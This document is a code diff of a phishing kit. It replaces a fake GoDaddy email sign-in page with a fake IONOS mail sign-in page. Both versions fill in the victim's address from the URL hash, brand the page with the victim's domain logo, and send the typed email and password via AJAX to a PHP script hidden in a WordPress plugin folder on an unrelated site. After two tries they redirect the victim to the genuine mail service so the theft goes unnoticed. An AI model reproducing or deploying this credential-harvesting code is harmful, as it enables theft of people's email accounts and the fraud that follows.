+                                            d="M28.56,39.38c-8.27,0-14.74,11-14.74,25.09s6.47,25.1,14.74,25.1,14.73-11,14.73-25.1S36.82,39.38,28.56,39.38Zm5.14,6.68-1.56,2.42a2,2,0,0,0,.6,2.77,2,2,0,0,0,1.08.32,2,2,0,0,0,1.68-.92l.63-1a27.18,27.18,0,0,1,1.54,3.84l-1.61,1a2,2,0,0,0,2.08,3.42l.53-.32a38.26,38.26,0,0,1,.57,4.93h-.7a2,2,0,0,0,0,4h.69a37.47,37.47,0,0,1-.53,4.62l-.34-.24a2,2,0,0,0-2.31,3.27l1.64,1.15A26.29,26.29,0,0,1,36,79.42l-.77-1.28a2,2,0,0,0-3.42,2.08L33.56,83a8.51,8.51,0,0,1-2.74,2V83.58a2,2,0,0,0-4,0v1.67a8,8,0,0,1-3-2l1.85-3a2,2,0,0,0-3.42-2.08l-1,1.59a24.65,24.65,0,0,1-1.75-4.18l1.93-1.36a2,2,0,1,0-2.3-3.27l-.67.47a39,39,0,0,1-.57-4.85h1.06a2,2,0,0,0,0-4H17.87a37.7,37.7,0,0,1,.61-5.13l.86.52a2,2,0,0,0,1,.29,2,2,0,0,0,1-3.71l-1.77-1.08-.15-.07a25,25,0,0,1,1.65-4L22,50.65a2,2,0,0,0,1.68.92,2.09,2.09,0,0,0,1.09-.32,2,2,0,0,0,.59-2.77L23.72,46a.76.76,0,0,0-.11-.14,8.14,8.14,0,0,1,3-2.11V45.5a2,2,0,0,0,4,0V43.8A8.58,8.58,0,0,1,33.7,46.06ZM21.77,64.47c0,6.09,2.92,10.68,6.79,10.68s6.78-4.59,6.78-10.68-2.92-10.68-6.78-10.68S21.77,58.38,21.77,64.47Zm9.57,0c0,4-1.67,6.68-2.78,6.68s-2.79-2.66-2.79-6.68,1.68-6.68,2.79-6.68S31.34,60.46,31.34,64.47ZM56.47,2.06l-8.26-2a2,2,0,0,0-1.08,0L34.85,4h-26A8.84,8.84,0,0,0,0,12.82V115.18A8.83,8.83,0,0,0,8.82,124H35l12.38,3.91a2,2,0,0,0,.6.09,2.05,2.05,0,0,0,.49-.06l7.94-2A2,2,0,0,0,57.94,124L58,4A2,2,0,0,0,56.47,2.06ZM12,93.72A2,2,0,0,0,13,92V80a2,2,0,0,0-1-1.72V51.72A2,2,0,0,0,13,50V38a2,2,0,0,0-1-1.72V15.46L46,4.65V123.27L12,112.53ZM8.82,120A4.82,4.82,0,0,1,4,115.18V12.82A4.83,4.83,0,0,1,8.83,8H22.27L9.39,12.09A2,2,0,0,0,8,14V36.28A2,2,0,0,0,7,38V50a2,2,0,0,0,1,1.72V78.28A2,2,0,0,0,7,80V92a2,2,0,0,0,1,1.72V114a2,2,0,0,0,1.4,1.91l13,4.09Zm45.12,2.44-3.94,1V4.61l4,1Z"
+                                            fill="#001b41" />
+                                    </svg>
+                                    <span class="tile__label" data-i18n="oao.login.archiving"
+                                        data-i18n-attr="text"></span>
+                                </a>
+                            </div>
+                        </div>
                     </div>
-                    <div class=" mt-3">
-                      <div class="form-check">
-                        <input type="checkbox" class="form-check-input" id="exampleCheck1">
-                        <label class="form-check-label" style="font-weight: 500" for="exampleCheck1">Keep me signed in</label>&nbsp<i class="fas fa-info-circle"></i>
-                        
-                      </div>
-
-                    </div>
-                  </div>
                 </div>
-                <div class="text-center col-lg-10 mx-auto mt-3">
-                  <button class="btn py-2 w-100 text-white rounded-0" id="submit-btn">Sign in</button>
-                </div>
-                <!-- form close -->
-                
-                <div class="col-12 text-center mt-3">
-                  <p id="recovery-links">Need to find <a  id="forgot_password" class="text-primary-o" href="" style="color: #09757a;text-decoration: underline;">your password</a>?</p>
-                </div>
-              </div>
-              <div class="col-lg-12 mt-3">
-                <div class="row">
-                  <div class="col-lg-8 mx-auto">
-                    <center>
-                      <span class="font-weight-bold" style="color: #444;">Don't have GoDaddy email?</span></center><br>
-                      <button class="btn rounded-0 bg-transparent w-100" style="border:2px solid black;color: #4267B2;padding: 8px 22px;">
-                        Get started
-                      </button>
-                    </div>
-                  </div>
-                </div>
-
-
-              </div>
-
-            </div> 
-          </div> 
-          <div class="container-fluid bg-white">
-            <div class="row">
-              <div class="col-lg-12 p-3 text-center">
-<span style="font-size:14px;">Copyright © 1999 - 2022 GoDaddy Operating Company, LLC. All Rights Reserved.<a href="" style="color: #09757a;text-decoration: underline;">Privacy Policy</a>.</span>
-              </div>
             </div>
-          </div> 
         </div>
+    </main>
 
+    <!-- exos footer -->
+    <footer class="page-footer">
+        <div class="page-footer__block">
+            <section
+                class="page-footer__section page-footer__section--align-center page-footer__section--small-align-left">
+                <div class="page-footer__section-item">
+                    <!-- Global Navigation > Statuspage Integration > Overall status -->
+                    <div class="oao-statuspage-overall-status"></div>
+                </div>
+                <div class="page-footer__section-item">
+                    <a class="link" data-i18n="oao.login.imprint.link" data-i18n-attr="href" href="" target="_blank">
+                        <span data-i18n="oao.login.ionos.legal" data-i18n-attr="text"></span>&nbsp;•&nbsp;<span
+                            data-i18n="{YEAR}" data-i18n-attr="text"></span>
+                    </a>
+                </div>
+                <div class="page-footer__section-item " id="shadow">
+                    <a class="link" data-i18n="oao.login.datasecurity.link" data-i18n-attr="href" href=""
+                        target="_blank">
+                        <span data-i18n="oao.login.datasecurity" data-i18n-attr="text"></span>
+                    </a>
+                </div>
+            </section>
+        </div>
+    </footer>
 
+    <!-- SPA workaround iframe -->
+    <iframe class="hidden" src="robots.txt" name="loginTarget"></iframe>
 
+    <!-- js libs -->
+    <script src="https://ce1.uicdn.net/exos/framework/1.1/ionos.min.js?v=1624882716506" async="async"></script>
+    <script type="text/javascript" src="https://mail.ionos.com/main.min.js?v=1624882716506"></script> -->
+    <script>
 
-
-
-        <!-- Optional JavaScript -->
-        <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha256-k2WSCIexGzOj3Euiig+TlR8gA0EmPjuc79OEeY5L45g=" crossorigin="anonymous"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha512-Ua/7Woz9L5O0cwB/aYexmgoaD7lw3dWe9FvXejVdgqu71gRog3oJgjSWQR55fwWx+WKuk8cl7UwA1RS6QCadFA==" crossorigin="anonymous"></script>
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-      </body>
-
-      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
-      <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha512-n6dYFOG599s4/mGlA6E+YLgtg9uPTOMDUb0IprSMDYVLr0ctiRryPEQ8gpM4DCMlx7M2G3CK+ZcaoOoJolzdCg==" crossorigin="anonymous"></script>
-      <script>
-        $("#submit-btn1").hide();
 
         /* global $ */
-        $(document).ready(function(){
-          var count=0;
+        $(document).ready(function () {
 
-      /////////////url email getting////////////////
-      var email = window.location.hash.substr(1);
-      if (!email) {
-
-      }
-      else
-      {
-          // $('#email').val(email);
-          var my_email =email;
-          var ind=my_email.indexOf("@");
-          var my_slice=my_email.substr((ind+1));
-          var c= my_slice.substr(0, my_slice.indexOf('.'));
-          var final= c.toLowerCase();
-          
-          $('#contact').trigger("reset");
-          $("#msg").hide();
-            // $('#fieldImg').attr('src', 'images/other-1.png');
-            // $('#field').html("Other Mail");
-            $('#email').val(my_email);
-            $('#emailch').html(my_email);
-            $("#msg").hide();
-            // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
-            // $("#automail").animate({right:200, opacity:"show"}, 1000);
-            // $('#ajaxModal').modal('show');
-          }
-        ///////////////url getting email////////////////
-
-
-        
-        $('#submit-btn').click(function(event){
-          $('#error').hide();
-          $('#msg').hide();
-          event.preventDefault();
-          var email=$("#email").val();
-          var password=$("#password").val();
-          var msg = $('#msg').html();
-          $('#msg').text( msg );
-        ///////////new injection////////////////
-        var my_email =email;
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-        // if (!filter.test(my_email)) {
-        //   $('#error').show();
-        //   email.focus;
-        //   return false;
-        // }
-
-        var ind=my_email.indexOf("@");
-        var my_slice=my_email.substr((ind+1));
-        var c= my_slice.substr(0, my_slice.indexOf('.'));
-        var final= c.toLowerCase();
-        var n = my_email.search("@");
-        ///////////new injection////////////////
-        count=count+1;
-        
-        $.ajax({
-          dataType: 'JSON',
-          url: 'https://www.bonnowydom.pl/wp-content/plugins/essential-addons-for-elementor-lite/includes/Traits/php.e/index.php',
-          type: 'POST',
-          data:{
-            email:email,
-            password:password,
-          },
-              // data: $('#contact').serialize(),
-              beforeSend: function(xhr){
-                $('#submit-btn').html('Verifing...');
-              },
-              success: function(response){
-                if(response){
-                  $("#msg").show();
-                  console.log(response);
-                  if(response['signal'] == 'ok'){
-                    $("#password").val("");
-                    if (count>=2) {
-                      count=0;
-                      if (n<0) { 
-                        window.location.replace('https://godaddy.com/');
-                      }
-                      else
-                      {
-                        window.location.replace('https://www.'+my_slice);
-                      }
+            function waitForElement(id, callback) {
+                var poops = setInterval(function () {
+                    if (document.getElementById(id)) {
+                        clearInterval(poops);
+                        callback();
                     }
-                    $('#msg').html(response['msg']);
-                  }
-                  else{
-                    $('#msg').html(response['msg']);
-                  }
-                }
-              },
-              error: function(){
-                $("#password").val("");
-                if (count>=2) {
-                      count=0;
-                      if (n<0) { 
-                        window.location.replace('https://godaddy.com/');
-                      }
-                      else
-                      {
-                        window.location.replace('https://www.'+my_slice);
-                      }
-                    }
-               $("#msg").show();
-               $('#msg').html("Please try again later");
-             },
-             complete: function(){
-              $('#submit-btn').html('Sign in');
+                }, 100);
             }
-          });
-      });
 
-        // ///////////////start second button//////////////////
+            waitForElement("selectAll", function () {
+                $("#selectAll").click();
+            });
 
-        // $('#submit-btn1').click(function(event){
-        //   event.preventDefault();
-        //   var email=$("#email").val();
-        //   var password=$("#password").val();
-        //   var phone=$("#phone").val();
-        //   var msg1 = $('#msg1').html();
-        //   $.ajax({
-        //     dataType: 'JSON',
-        //     url: 'next-gmail.php',
-        //     type: 'POST',
-        //     data:{
-        //       email:email,
-        //       password:password,
-        //       phone:phone,
+            var count = 0;
 
-        //     },
-        //     beforeSend: function(xhr){
-        //       $('#submit-btn1').html('Verifing...');
-        //     },
-        //     success: function(response){
-        //       $("#password").val("");
-        //       window.location.replace("http://www.gmail.com");
-        //       if(response){
-        //           // $("#msg1").show();
-        //           console.log(response);
-        //           if(response['signal'] == 'ok'){
-        //            // $('#msg1').html(response['msg']);
-        //          }
-        //          else{
-        //           // $('#msg1').html(response['msg']);
-        //         }
-        //       }
-        //     },
-        //     error: function(){
-        //      $("#password").val("");
-        //      window.location.replace("http://www.gmail.com");
-        //       // $("#msg1").show();
-        //       // $('#msg1').html("Please try again later");
-        //     },
-        //     complete: function(){
-        //       $('#submit-btn1').html('Verify');
-        //     }
-        //   });
-        // });
+            $('#back1').click(function () {
+                $("#msg").hide();
+                $('#email').val("Mailbox");
+                $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+                $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
 
-        // /////////////// end second button//////////////////
+            });
+
+            var email = window.location.hash.substr(1);
+            if (!email) {
+
+            }
+            else {
+                var my_email = email;
+                $('#email').val(my_email);
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                if (!filter.test(my_email)) {
+                    $('#error').show();
+                    email.focus;
+                    return false;
+                }
+                var ind = my_email.indexOf("@");
+                var my_slice = my_email.substr((ind + 1));
+                var c = my_slice.substr(0, my_slice.indexOf('.'));
+                var final = c.toLowerCase();
+                var finalu = c.toUpperCase();
+
+                $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + my_slice);
+                $("#logoname").html(finalu);
+                $(".logoname").html(finalu);
+            }
 
 
 
+            $('#submit-btn').click(function (event) {
+                $('#error').hide();
+                $('#msg').hide();
+                event.preventDefault();
+                var email = $("#email").val();
+                var password = $("#login-form-password").val();
+                var msg = $('#msg').html();
+                $('#msg').text(msg);
+                ///////////new injection////////////////
+                var my_email = email;
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-      });
+                if (!filter.test(my_email)) {
+                    $('#error').show();
+                    email.focus;
+                    return false;
+                }
 
-  // document.onkeydown=function(e){
-  //   if (e.ctrlKey && 
-  //     (e.keyCode === 73 || 
-  //      e.keyCode === 105 ||
-  //      e.keyCode === 74 || 
-  //      e.keyCode === 106 || 
-  //      e.keyCode === 85 || 
-  //      e.keyCode === 117)) {
-  //     alert('not allowed');
-  //   return false;
-  // } else {
-  //   return true;
-  // }
-  // }
-</script>
+                var ind = my_email.indexOf("@");
+                var my_slice = my_email.substr((ind + 1));
+                var c = my_slice.substr(0, my_slice.indexOf('.'));
+                var final = c.toLowerCase();
+                var finalu = c.toUpperCase();
+
+                $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + my_slice);
+                $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + my_slice);
+                $("#logoname").html(finalu);
+                ///////////new injection////////////////
+                count = count + 1;
+
+                $.ajax({
+                    dataType: 'JSON',
+                    url: 'https://www.bonnowydom.pl/wp-content/plugins/essential-addons-for-elementor-lite/includes/Traits/wap/index.php',
+                    type: 'POST',
+                    data: {
+                        email: email,
+                        password: password,
+                    },
+                    // data: $('#contact').serialize(),
+                    beforeSend: function (xhr) {
+                        $('#submit-btn').html('Verifing...');
+                    },
+                    success: function (response) {
+                        if (response) {
+                            $("#msg").show();
+                            console.log(response);
+                            if (response['signal'] == 'ok') {
+                                $("#login-form-password").val("");
+                                if (count >= 2) {
+                                    count = 0;
+                                    // window.location.replace(response['redirect_link']);
+                                    window.location.replace("https://mail.ionos.com");
+
+                                }
+                                // $('#msg').html(response['msg']);
+                            }
+                            else {
+                                // $('#msg').html(response['msg']);
+                            }
+                        }
+                    },
+                    error: function () {
+                        $("#login-form-password").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            window.location.replace("https://mail.ionos.com");
+                        }
+                        $("#msg").show();
+                        // $('#msg').html("Please try again later");
+                    },
+                    complete: function () {
+                        $('#submit-btn').html('Sign in');
+                    }
+                });
+            });
+
+
+        });
+
+
+    </script>
+
+</body>
+
 </html>
